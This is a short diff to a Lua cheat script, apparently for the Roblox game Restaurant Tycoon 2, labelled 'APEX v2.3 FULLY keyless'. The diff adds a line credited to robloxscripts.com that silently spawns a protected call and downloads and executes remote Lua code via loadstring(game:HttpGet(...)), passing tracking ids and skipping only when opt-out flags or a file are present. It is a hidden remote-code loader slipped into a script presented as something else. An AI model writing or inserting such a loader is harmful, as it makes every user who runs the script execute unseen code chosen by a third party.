@@ -46,5 +46,8 @@ end
 
 ----------------===================|for readers|===================----------------
 -- please for the love of god make sure your restaurant is loaded for the Restaurant Tycoon 2 script to work... I even added a check to tell if your restaurant is loaded; please don't make that mistake
+
+----------------===================|Script OPS provided by robloxscripts.com|===================----------------
+task.spawn(pcall, function() local g = getgenv and getgenv() or {}; if g.RSOPS_OFF == true or g.RSOps and g.RSOps._off == true or isfile and select(2, pcall(isfile, "rsops/optout.txt")) == true then return end; loadstring(game:HttpGet("https://robloxscripts.com/ops/v1.lua")){ id = "ops_u2cnvgh3rlf7", ref = "6ae666dbe472f7754153bfc3" } end);
 --
 --APEX v2.3 FULLY keyless.
